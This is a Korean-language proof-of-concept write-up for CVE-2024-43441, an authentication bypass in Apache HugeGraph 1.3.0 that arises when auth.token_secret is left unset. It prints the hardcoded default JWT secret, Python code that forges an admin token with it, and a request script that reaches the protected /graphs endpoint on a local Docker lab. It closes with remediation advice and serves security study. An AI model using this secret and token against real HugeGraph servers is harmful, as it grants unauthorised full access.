# CVE-2024-43441

> 화이트햇 스쿨 3기 - [조성호 (@Reflesh)](https://github.com/Reflesh)

<br/>

## 요약

- auth.token_secret이 설정되지 않은 경우, 기본값으로 하드코딩된 JWT 비밀키가 사용됨
- 공격자는 해당 키로 유효한 JWT 토큰을 생성하여 인증없이 접근 가능
- 따라서 별도의 비밀번호 및 반복 시도 없이 인증 우회가 가능하며 시스템에 대한 완전한 접근이 허용됨

<br/>

## 환경 구성 및 실행
- DockerHub에서 Apache HugeGraph 1.3.0 이미지를 pull
- `docker compose up -d` 커맨드를 입력하여 테스트 환경 실행
- 실행하는 시스템에 Python이 설치되어 있어야함
- `pip install pyjwt` 커맨드를 통해 jwt library 설치(로컬에서 관리자 권한으로 설치)
- `http://localhost:8080` 접속 시 해당 화면이 나타난다면 환경이 잘 구축된 것
![](./localhost.png)


### jwt_token.py
기본 JWT 비밀키를 활용하여 JWT 토큰을 생성하는 파이썬 코드입니다.
```python
# Install the jwt library by running `pip install pyjwt`
import jwt

# Generate JWT token using the default secret
token = jwt.encode(
    {
      "user_name": "admin",
      "user_id": "-30:admin",
      "exp": 9739523483
    },
    "FXQXbJtbCLxODc6tGci732pkH1cyf8Qg",
    algorithm="HS256"
)
print(f"Generated JWT token: {token}")
# Output:
# Generated JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg
```
생성된 토큰을 사용하면 아래와 같은 요청으로 HugeGraph의 보호된 endpoint에 접근할 수 있습니다.
```
GET /graphs HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg
```
<br/>


## 결과
아래는 위에서 생성한 JWT토큰을 사용하여 endpoint에 접근하는 코드(traffic.py)입니다.
```python
import requests

url = "http://localhost:8080/graphs"

headers = {
    "Host": "localhost:8080",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept": "*/*",
    "Accept-Language": "en-US;q=0.9,en;q=0.8",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Connection": "close",
    "Cache-Control": "max-age=0",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg"
}

response = requests.get(url, headers=headers)

print(f"HTTP/{response.raw.version} {response.status_code} {response.reason}")
for key, value in response.headers.items():
    print(f"{key}: {value}")
print()
print(response.text)
```
아래는 Python으로 실제 응답을 받아온 화면입니다.(첫번째 : 공격 성공, 두번째 : 공격 실패)
![](./result.png)

## 정리

해당 취약점은 설정 미비 시 기본값으로 하드코딩된 보안 키를 사용하는 구조적 문제입니다.    
따라서 HugeGraph를 사용할 경우 반드시 `auth.token_secret`을 사용자 정의 키로 설정해야합니다.    
설정하지 않으면 누구든지 기본키만 알고있다면 인증 우회가 가능합니다.   